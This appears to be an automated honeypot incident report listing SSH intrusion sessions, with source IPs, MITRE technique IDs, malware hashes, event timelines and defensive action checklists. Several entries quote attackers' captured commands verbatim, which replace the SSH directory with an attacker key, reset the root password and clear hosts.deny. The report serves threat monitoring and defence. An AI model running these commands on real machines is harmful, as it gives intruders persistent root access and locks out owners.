| `2026-05-13 18:42:59` | `cowrie.command.input` |
| `2026-05-13 18:42:59` | `cowrie.command.failed` |
| `2026-05-13 18:43:00` | `cowrie.log.closed` |
| `2026-05-13 18:43:00` | `cowrie.session.params` |
| `2026-05-13 18:43:00` | `cowrie.command.input` |
| `2026-05-13 18:43:00` | `cowrie.session.file_download` |
| `2026-05-13 18:43:00` | `cowrie.log.closed` |
| `2026-05-13 18:43:13` | `cowrie.session.params` |
| `2026-05-13 18:43:13` | `cowrie.command.input` |
| `2026-05-13 18:43:13` | `cowrie.log.closed` |
| `2026-05-13 18:43:13` | `cowrie.session.params` |
| `2026-05-13 18:43:13` | `cowrie.command.input` |
| `2026-05-13 18:43:13` | `cowrie.log.closed` |
| `2026-05-13 18:43:14` | `cowrie.session.params` |
| `2026-05-13 18:43:14` | `cowrie.command.input` |
| `2026-05-13 18:43:14` | `cowrie.session.file_download` |
| `2026-05-13 18:43:14` | `cowrie.log.closed` |
| `2026-05-13 18:43:14` | `cowrie.session.params` |
| `2026-05-13 18:43:14` | `cowrie.command.input` |
| `2026-05-13 18:43:14` | `cowrie.log.closed` |
| `2026-05-13 18:43:15` | `cowrie.session.params` |
| `2026-05-13 18:43:15` | `cowrie.command.input` |
| `2026-05-13 18:43:15` | `cowrie.log.closed` |
| `2026-05-13 18:43:15` | `cowrie.session.params` |
| `2026-05-13 18:43:15` | `cowrie.command.input` |
| `2026-05-13 18:43:15` | `cowrie.command.input` |
| `2026-05-13 18:43:15` | `cowrie.log.closed` |
| `2026-05-13 18:43:16` | `cowrie.session.params` |
| `2026-05-13 18:43:16` | `cowrie.command.input` |
| `2026-05-13 18:43:16` | `cowrie.log.closed` |
| `2026-05-13 18:43:16` | `cowrie.session.params` |
| `2026-05-13 18:43:16` | `cowrie.command.input` |
| `2026-05-13 18:43:17` | `cowrie.log.closed` |
| `2026-05-13 18:43:17` | `cowrie.session.params` |
| `2026-05-13 18:43:17` | `cowrie.command.input` |
| `2026-05-13 18:43:17` | `cowrie.log.closed` |
| `2026-05-13 18:43:17` | `cowrie.session.params` |
| `2026-05-13 18:43:17` | `cowrie.command.input` |
| `2026-05-13 18:43:17` | `cowrie.log.closed` |
| `2026-05-13 18:43:18` | `cowrie.session.params` |
| `2026-05-13 18:43:18` | `cowrie.command.input` |
| `2026-05-13 18:43:18` | `cowrie.log.closed` |
| `2026-05-13 18:43:18` | `cowrie.session.params` |
| `2026-05-13 18:43:18` | `cowrie.command.input` |
| `2026-05-13 18:43:18` | `cowrie.log.closed` |
| `2026-05-13 18:43:19` | `cowrie.session.params` |
| `2026-05-13 18:43:19` | `cowrie.command.input` |
| `2026-05-13 18:43:19` | `cowrie.log.closed` |
| `2026-05-13 18:43:19` | `cowrie.session.params` |
| `2026-05-13 18:43:19` | `cowrie.command.input` |
| `2026-05-13 18:43:19` | `cowrie.log.closed` |
| `2026-05-13 18:43:20` | `cowrie.session.params` |
| `2026-05-13 18:43:20` | `cowrie.command.input` |
| `2026-05-13 18:43:20` | `cowrie.log.closed` |
| `2026-05-13 18:43:20` | `cowrie.session.params` |
| `2026-05-13 18:43:20` | `cowrie.command.input` |
| `2026-05-13 18:43:20` | `cowrie.log.closed` |
| `2026-05-13 18:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]231` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-193d84c2f7d1

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]231` |
| **First Seen** | 2026-05-13 18:44 |
| **Last Seen** | 2026-05-13 18:44 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:VaohhaLxR1NM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:44:30` | `cowrie.session.connect` |
| `2026-05-13 18:44:30` | `cowrie.client.version` |
| `2026-05-13 18:44:31` | `cowrie.client.kex` |
| `2026-05-13 18:44:31` | `cowrie.login.success` |
| `2026-05-13 18:44:32` | `cowrie.session.params` |
| `2026-05-13 18:44:32` | `cowrie.command.input` |
| `2026-05-13 18:44:32` | `cowrie.command.failed` |
| `2026-05-13 18:44:32` | `cowrie.log.closed` |
| `2026-05-13 18:44:32` | `cowrie.session.params` |
| `2026-05-13 18:44:32` | `cowrie.command.input` |
| `2026-05-13 18:44:32` | `cowrie.session.file_download` |
| `2026-05-13 18:44:32` | `cowrie.log.closed` |
| `2026-05-13 18:44:45` | `cowrie.session.params` |
| `2026-05-13 18:44:45` | `cowrie.command.input` |
| `2026-05-13 18:44:45` | `cowrie.log.closed` |
| `2026-05-13 18:44:45` | `cowrie.session.params` |
| `2026-05-13 18:44:45` | `cowrie.command.input` |
| `2026-05-13 18:44:45` | `cowrie.log.closed` |
| `2026-05-13 18:44:46` | `cowrie.session.params` |
| `2026-05-13 18:44:46` | `cowrie.command.input` |
| `2026-05-13 18:44:46` | `cowrie.session.file_download` |
| `2026-05-13 18:44:46` | `cowrie.log.closed` |
| `2026-05-13 18:44:46` | `cowrie.session.params` |
| `2026-05-13 18:44:46` | `cowrie.command.input` |
| `2026-05-13 18:44:46` | `cowrie.log.closed` |
| `2026-05-13 18:44:47` | `cowrie.session.params` |
| `2026-05-13 18:44:47` | `cowrie.command.input` |
| `2026-05-13 18:44:47` | `cowrie.log.closed` |
| `2026-05-13 18:44:47` | `cowrie.session.params` |
| `2026-05-13 18:44:47` | `cowrie.command.input` |
| `2026-05-13 18:44:47` | `cowrie.command.input` |
| `2026-05-13 18:44:47` | `cowrie.log.closed` |
| `2026-05-13 18:44:48` | `cowrie.session.params` |
| `2026-05-13 18:44:48` | `cowrie.command.input` |
| `2026-05-13 18:44:48` | `cowrie.log.closed` |
| `2026-05-13 18:44:48` | `cowrie.session.params` |
| `2026-05-13 18:44:48` | `cowrie.command.input` |
| `2026-05-13 18:44:48` | `cowrie.log.closed` |
| `2026-05-13 18:44:48` | `cowrie.session.params` |
| `2026-05-13 18:44:48` | `cowrie.command.input` |
| `2026-05-13 18:44:49` | `cowrie.log.closed` |
| `2026-05-13 18:44:49` | `cowrie.session.params` |
| `2026-05-13 18:44:49` | `cowrie.command.input` |
| `2026-05-13 18:44:49` | `cowrie.log.closed` |
| `2026-05-13 18:44:49` | `cowrie.session.params` |
| `2026-05-13 18:44:49` | `cowrie.command.input` |
| `2026-05-13 18:44:50` | `cowrie.log.closed` |
| `2026-05-13 18:44:50` | `cowrie.session.params` |
| `2026-05-13 18:44:50` | `cowrie.command.input` |
| `2026-05-13 18:44:50` | `cowrie.log.closed` |
| `2026-05-13 18:44:50` | `cowrie.session.params` |
| `2026-05-13 18:44:50` | `cowrie.command.input` |
| `2026-05-13 18:44:50` | `cowrie.log.closed` |
| `2026-05-13 18:44:51` | `cowrie.session.params` |
| `2026-05-13 18:44:51` | `cowrie.command.input` |
| `2026-05-13 18:44:51` | `cowrie.log.closed` |
| `2026-05-13 18:44:51` | `cowrie.session.params` |
| `2026-05-13 18:44:51` | `cowrie.command.input` |
| `2026-05-13 18:44:51` | `cowrie.log.closed` |
| `2026-05-13 18:44:52` | `cowrie.session.params` |
| `2026-05-13 18:44:52` | `cowrie.command.input` |
| `2026-05-13 18:44:52` | `cowrie.log.closed` |
| `2026-05-13 18:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]231` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1702f1a47d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]231` |
| **First Seen** | 2026-05-13 18:45 |
| **Last Seen** | 2026-05-13 18:46 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:sQWPBW9Hk1XD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:45:40` | `cowrie.session.connect` |
| `2026-05-13 18:45:42` | `cowrie.client.version` |
| `2026-05-13 18:45:42` | `cowrie.client.kex` |
| `2026-05-13 18:45:43` | `cowrie.login.success` |
| `2026-05-13 18:45:43` | `cowrie.session.params` |
| `2026-05-13 18:45:43` | `cowrie.command.input` |
| `2026-05-13 18:45:43` | `cowrie.command.failed` |
| `2026-05-13 18:45:43` | `cowrie.log.closed` |
| `2026-05-13 18:45:44` | `cowrie.session.params` |
| `2026-05-13 18:45:44` | `cowrie.command.input` |
| `2026-05-13 18:45:44` | `cowrie.session.file_download` |
| `2026-05-13 18:45:44` | `cowrie.log.closed` |
| `2026-05-13 18:45:56` | `cowrie.session.params` |
| `2026-05-13 18:45:56` | `cowrie.command.input` |
| `2026-05-13 18:45:57` | `cowrie.log.closed` |
| `2026-05-13 18:45:57` | `cowrie.session.params` |
| `2026-05-13 18:45:57` | `cowrie.command.input` |
| `2026-05-13 18:45:57` | `cowrie.log.closed` |
| `2026-05-13 18:45:58` | `cowrie.session.params` |
| `2026-05-13 18:45:58` | `cowrie.command.input` |
| `2026-05-13 18:45:58` | `cowrie.session.file_download` |
| `2026-05-13 18:45:58` | `cowrie.log.closed` |
| `2026-05-13 18:45:58` | `cowrie.session.params` |
| `2026-05-13 18:45:58` | `cowrie.command.input` |
| `2026-05-13 18:45:58` | `cowrie.log.closed` |
| `2026-05-13 18:45:59` | `cowrie.session.params` |
| `2026-05-13 18:45:59` | `cowrie.command.input` |
| `2026-05-13 18:45:59` | `cowrie.log.closed` |
| `2026-05-13 18:45:59` | `cowrie.session.params` |
| `2026-05-13 18:45:59` | `cowrie.command.input` |
| `2026-05-13 18:45:59` | `cowrie.command.input` |
| `2026-05-13 18:45:59` | `cowrie.log.closed` |
| `2026-05-13 18:46:00` | `cowrie.session.params` |
| `2026-05-13 18:46:00` | `cowrie.command.input` |
| `2026-05-13 18:46:00` | `cowrie.log.closed` |
| `2026-05-13 18:46:00` | `cowrie.session.params` |
| `2026-05-13 18:46:00` | `cowrie.command.input` |
| `2026-05-13 18:46:00` | `cowrie.log.closed` |
| `2026-05-13 18:46:00` | `cowrie.session.params` |
| `2026-05-13 18:46:00` | `cowrie.command.input` |
| `2026-05-13 18:46:01` | `cowrie.log.closed` |
| `2026-05-13 18:46:01` | `cowrie.session.params` |
| `2026-05-13 18:46:01` | `cowrie.command.input` |
| `2026-05-13 18:46:01` | `cowrie.log.closed` |
| `2026-05-13 18:46:01` | `cowrie.session.params` |
| `2026-05-13 18:46:01` | `cowrie.command.input` |
| `2026-05-13 18:46:02` | `cowrie.log.closed` |
| `2026-05-13 18:46:02` | `cowrie.session.params` |
| `2026-05-13 18:46:02` | `cowrie.command.input` |
| `2026-05-13 18:46:02` | `cowrie.log.closed` |
| `2026-05-13 18:46:02` | `cowrie.session.params` |
| `2026-05-13 18:46:02` | `cowrie.command.input` |
| `2026-05-13 18:46:02` | `cowrie.log.closed` |
| `2026-05-13 18:46:03` | `cowrie.session.params` |
| `2026-05-13 18:46:03` | `cowrie.command.input` |
| `2026-05-13 18:46:03` | `cowrie.log.closed` |
| `2026-05-13 18:46:03` | `cowrie.session.params` |
| `2026-05-13 18:46:03` | `cowrie.command.input` |
| `2026-05-13 18:46:03` | `cowrie.log.closed` |
| `2026-05-13 18:46:04` | `cowrie.session.params` |
| `2026-05-13 18:46:04` | `cowrie.command.input` |
| `2026-05-13 18:46:04` | `cowrie.log.closed` |
| `2026-05-13 18:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]231` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d483f9dc9736

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]162` |
| **First Seen** | 2026-05-13 19:08 |
| **Last Seen** | 2026-05-13 19:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 19:08:46` | `cowrie.session.connect` |
| `2026-05-13 19:08:46` | `cowrie.client.version` |
| `2026-05-13 19:08:47` | `cowrie.client.kex` |
| `2026-05-13 19:08:47` | `cowrie.login.success` |
| `2026-05-13 19:08:48` | `cowrie.session.params` |
| `2026-05-13 19:08:48` | `cowrie.command.input` |
| `2026-05-13 19:08:48` | `cowrie.command.failed` |
| `2026-05-13 19:08:48` | `cowrie.log.closed` |
| `2026-05-13 19:08:48` | `cowrie.session.params` |
| `2026-05-13 19:08:48` | `cowrie.command.input` |
| `2026-05-13 19:08:49` | `cowrie.session.file_download` |
| `2026-05-13 19:08:49` | `cowrie.log.closed` |
| `2026-05-13 19:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]162` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17499e9290d3

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]162` |
| **First Seen** | 2026-05-13 19:08 |
| **Last Seen** | 2026-05-13 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 19:08:51` | `cowrie.session.connect` |
| `2026-05-13 19:08:51` | `cowrie.client.version` |
| `2026-05-13 19:08:51` | `cowrie.client.kex` |
| `2026-05-13 19:08:52` | `cowrie.login.success` |
| `2026-05-13 19:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]162` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9f8b037e750

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]13` |
| **First Seen** | 2026-05-13 19:20 |
| **Last Seen** | 2026-05-13 19:20 |
| **Session Duration** | 24s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 19:20:00` | `cowrie.session.connect` |
| `2026-05-13 19:20:00` | `cowrie.client.version` |
| `2026-05-13 19:20:00` | `cowrie.client.kex` |
| `2026-05-13 19:20:01` | `cowrie.client.fingerprint` |
| `2026-05-13 19:20:01` | `cowrie.login.failed` |
| `2026-05-13 19:20:01` | `cowrie.login.success` |
| `2026-05-13 19:20:24` | `cowrie.direct-tcpip.request` |
| `2026-05-13 19:20:24` | `cowrie.direct-tcpip.ja4` |
| `2026-05-13 19:20:24` | `cowrie.direct-tcpip.data` |
| `2026-05-13 19:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]13` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef47b6a55ebd

| Field | Detail |
|---|---|
| **Source IP** | `101.53.236[.]155` |
| **First Seen** | 2026-05-13 19:41 |
| **Last Seen** | 2026-05-13 19:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 19:41:38` | `cowrie.session.connect` |
| `2026-05-13 19:41:38` | `cowrie.client.version` |
| `2026-05-13 19:41:39` | `cowrie.client.kex` |
| `2026-05-13 19:41:39` | `cowrie.login.success` |
| `2026-05-13 19:41:40` | `cowrie.session.params` |
| `2026-05-13 19:41:40` | `cowrie.command.input` |
| `2026-05-13 19:41:40` | `cowrie.command.failed` |
| `2026-05-13 19:41:40` | `cowrie.log.closed` |
| `2026-05-13 19:41:40` | `cowrie.session.params` |
| `2026-05-13 19:41:40` | `cowrie.command.input` |
| `2026-05-13 19:41:40` | `cowrie.session.file_download` |
| `2026-05-13 19:41:40` | `cowrie.log.closed` |
| `2026-05-13 19:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.53.236[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.53.236[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-803410d5fced

| Field | Detail |
|---|---|
| **Source IP** | `101.53.236[.]155` |
| **First Seen** | 2026-05-13 19:41 |
| **Last Seen** | 2026-05-13 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 19:41:43` | `cowrie.session.connect` |
| `2026-05-13 19:41:43` | `cowrie.client.version` |
| `2026-05-13 19:41:43` | `cowrie.client.kex` |
| `2026-05-13 19:41:44` | `cowrie.login.success` |
| `2026-05-13 19:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.53.236[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.53.236[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4457928ef0ec

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:26 |
| **Last Seen** | 2026-05-13 21:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:26:09` | `cowrie.session.connect` |
| `2026-05-13 21:26:09` | `cowrie.client.version` |
| `2026-05-13 21:26:09` | `cowrie.client.kex` |
| `2026-05-13 21:26:10` | `cowrie.login.success` |
| `2026-05-13 21:26:10` | `cowrie.session.params` |
| `2026-05-13 21:26:10` | `cowrie.command.input` |
| `2026-05-13 21:26:10` | `cowrie.command.failed` |
| `2026-05-13 21:26:10` | `cowrie.log.closed` |
| `2026-05-13 21:26:11` | `cowrie.session.params` |
| `2026-05-13 21:26:11` | `cowrie.command.input` |
| `2026-05-13 21:26:11` | `cowrie.session.file_download` |
| `2026-05-13 21:26:11` | `cowrie.log.closed` |
| `2026-05-13 21:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0554653bb17f

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:26 |
| **Last Seen** | 2026-05-13 21:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:26:13` | `cowrie.session.connect` |
| `2026-05-13 21:26:13` | `cowrie.client.version` |
| `2026-05-13 21:26:13` | `cowrie.client.kex` |
| `2026-05-13 21:26:14` | `cowrie.login.success` |
| `2026-05-13 21:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `110.36.2[.]23` | **24** | 2026-05-13 20:08 | 2026-05-13 20:13 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.114[.]231` | **24** | 2026-05-13 18:37 | 2026-05-13 18:49 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `23.94.77[.]145` | **17** | 2026-05-13 18:04 | 2026-05-13 21:22 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `45.156.129[.]85` | **7** | 2026-05-13 19:48 | 2026-05-13 19:49 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `45.148.120[.]187` | **4** | 2026-05-13 18:12 | 2026-05-13 20:52 | 5m | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]86` | **3** | 2026-05-13 19:48 | 2026-05-13 19:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.51.153[.]37` | **2** | 2026-05-13 18:05 | 2026-05-13 18:06 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.193[.]255` | **2** | 2026-05-13 19:53 | 2026-05-13 19:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `203.153.20[.]222` | **2** | 2026-05-13 19:43 | 2026-05-13 19:45 | 4m | 0 | `T1592` | 🟢 LOW |
| `83.111.200[.]154` | **2** | 2026-05-13 18:05 | 2026-05-13 18:07 | 4m | 0 | `T1592` | 🟢 LOW |
| `101.126.81[.]18` | 1 | 2026-05-13 18:17 | 2026-05-13 18:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.53.236[.]155` | 1 | 2026-05-13 19:41 | 2026-05-13 19:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.120.227[.]88` | 1 | 2026-05-13 18:11 | 2026-05-13 18:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.243.24[.]124` | 1 | 2026-05-13 18:16 | 2026-05-13 18:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.158.200[.]53` | 1 | 2026-05-13 20:12 | 2026-05-13 20:13 | 30s | 0 | `T1592` | 🟢 LOW |
